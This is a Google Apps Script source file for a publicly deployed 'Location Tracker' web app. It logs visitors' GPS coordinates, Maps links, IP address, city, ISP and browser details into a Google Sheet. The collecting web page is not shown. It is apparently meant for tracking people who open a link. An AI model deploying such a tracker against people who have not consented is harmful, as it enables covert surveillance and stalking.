// ============================================================
// Google Apps Script — Paste this in Google Apps Script Editor
// ============================================================
// Sheet Name: Singularity02
//
// SETUP:
// 1. Open your Google Sheet "Singularity02"
// 2. Go to Extensions > Apps Script
// 3. Delete all existing code and paste this entire script
// 4. Click Deploy > New deployment > Web app
// 5. Execute as: Me | Who has access: Anyone
// 6. Deploy and copy the Web App URL
// 7. Paste URL in index.html where it says YOUR_GOOGLE_APPS_SCRIPT_URL_HERE
// ============================================================

// ⚠️ CHANGE THIS if your sheet tab name is different
var SHEET_NAME = "Sheet1";

function doPost(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName(SHEET_NAME);

    // If the sheet tab doesn't exist, fall back to first sheet
    if (!sheet) {
      sheet = ss.getSheets()[0];
    }

    var expectedHeaders = [
      "S No.",
      "Timestamp",
      "Type",
      "Latitude",
      "Longitude",
      "Accuracy",
      "Google Maps Link",
      "IP Address",
      "City",
      "Region",
      "Country",
      "ISP",
      "User Agent",
      "Platform",
      "Language",
      "Screen Resolution",
      "Referrer"
    ];

    // Add or fix headers
    var needsHeaders = false;
    if (sheet.getLastRow() === 0) {
      needsHeaders = true;
    } else {
      // Check if current headers match expected
      var currentHeader = sheet.getRange(1, 1).getValue();
      var col3 = sheet.getRange(1, 3).getValue();
      if (col3 !== "Type") {
        needsHeaders = true;
        // Clear old headers row and rewrite
        sheet.getRange(1, 1, 1, sheet.getLastColumn()).clearContent();
      }
    }

    if (needsHeaders) {
      sheet.getRange(1, 1, 1, expectedHeaders.length).setValues([expectedHeaders]);
      var headerRange = sheet.getRange(1, 1, 1, expectedHeaders.length);
      headerRange.setFontWeight("bold");
      headerRange.setBackground("#1a1a2e");
      headerRange.setFontColor("#00fff5");
      headerRange.setFontFamily("Consolas");
      headerRange.setFontSize(10);
      headerRange.setHorizontalAlignment("center");
      headerRange.setBorder(true, true, true, true, true, true, "#00fff5", SpreadsheetApp.BorderStyle.SOLID);
      sheet.setFrozenRows(1);
      sheet.setColumnWidth(1, 55);   // S No.
      sheet.setColumnWidth(2, 170);  // Timestamp
      sheet.setColumnWidth(3, 60);   // Type
      sheet.setColumnWidth(4, 115);  // Latitude
      sheet.setColumnWidth(5, 115);  // Longitude
      sheet.setColumnWidth(6, 180);  // Accuracy
      sheet.setColumnWidth(7, 340);  // Maps Link
      sheet.setColumnWidth(8, 130);  // IP
      sheet.setColumnWidth(9, 120);  // City
      sheet.setColumnWidth(10, 120); // Region
      sheet.setColumnWidth(11, 100); // Country
      sheet.setColumnWidth(12, 220); // ISP
      sheet.setColumnWidth(13, 420); // User Agent
      sheet.setColumnWidth(14, 100); // Platform
      sheet.setColumnWidth(15, 80);  // Language
      sheet.setColumnWidth(16, 130); // Screen Res
      sheet.setColumnWidth(17, 100); // Referrer
    }

    var data = JSON.parse(e.postData.contents);

    // Auto-increment S No.
    var lastRow = sheet.getLastRow();
    var serialNo = lastRow; // Row 1 = header, so row 2 = S No. 1

    // Append the data row
    var newRow = lastRow + 1;
    sheet.appendRow([
      serialNo,
      data.timestamp || new Date().toLocaleString(),
      data.locationType || "Unknown",
      data.latitude || "N/A",
      data.longitude || "N/A",
      data.accuracy || "N/A",
      data.googleMapsLink || "N/A",
      data.ip || "N/A",
      data.city || "N/A",
      data.region || "N/A",
      data.country || "N/A",
      data.isp || "N/A",
      data.userAgent || "N/A",
      data.platform || "N/A",
      data.language || "N/A",
      data.screenResolution || "N/A",
      data.referrer || "N/A"
    ]);

    // Style the new data row
    var dataRange = sheet.getRange(newRow, 1, 1, 17);
    dataRange.setFontFamily("Consolas");
    dataRange.setFontSize(9);
    dataRange.setVerticalAlignment("middle");
    dataRange.setBorder(true, true, true, true, true, true, "#cccccc", SpreadsheetApp.BorderStyle.SOLID);

    // Color code the Type column — BRIGHT & VISIBLE
    var typeCell = sheet.getRange(newRow, 3);
    typeCell.setFontWeight("bold");
    typeCell.setHorizontalAlignment("center");
    if (data.locationType === "GPS") {
      typeCell.setBackground("#d4edda");  // light green bg
      typeCell.setFontColor("#155724");   // dark green text
    } else if (data.locationType === "IP") {
      typeCell.setBackground("#cce5ff");  // light blue bg
      typeCell.setFontColor("#004085");   // dark blue text
    }

    // Style S No. column
    sheet.getRange(newRow, 1).setHorizontalAlignment("center");
    sheet.getRange(newRow, 1).setFontWeight("bold");

    // Alternate row shading — VISIBLE colors
    if (newRow % 2 === 0) {
      dataRange.setBackground("#f0f0f5"); // light grey
    } else {
      dataRange.setBackground("#ffffff");  // white
    }
    // Re-apply type cell color after row color
    if (data.locationType === "GPS") {
      typeCell.setBackground("#d4edda");
    } else if (data.locationType === "IP") {
      typeCell.setBackground("#cce5ff");
    }

    // Highlight IP address column
    var ipCell = sheet.getRange(newRow, 8);
    ipCell.setFontColor("#d63384");  // pink
    ipCell.setFontWeight("bold");

    // Highlight City column
    var cityCell = sheet.getRange(newRow, 9);
    cityCell.setFontColor("#6f42c1"); // purple
    cityCell.setFontWeight("bold");

    // Make Google Maps link blue & underlined
    var mapsCell = sheet.getRange(newRow, 7);
    mapsCell.setFontColor("#0d6efd"); // blue

    return ContentService
      .createTextOutput(JSON.stringify({ status: "success", message: "Data logged" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Handle GET requests (for testing — visit the URL in browser to check)
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({
      status: "active",
      message: "Location Tracker is running! Send POST requests to log data."
    }))
    .setMimeType(ContentService.MimeType.JSON);
}
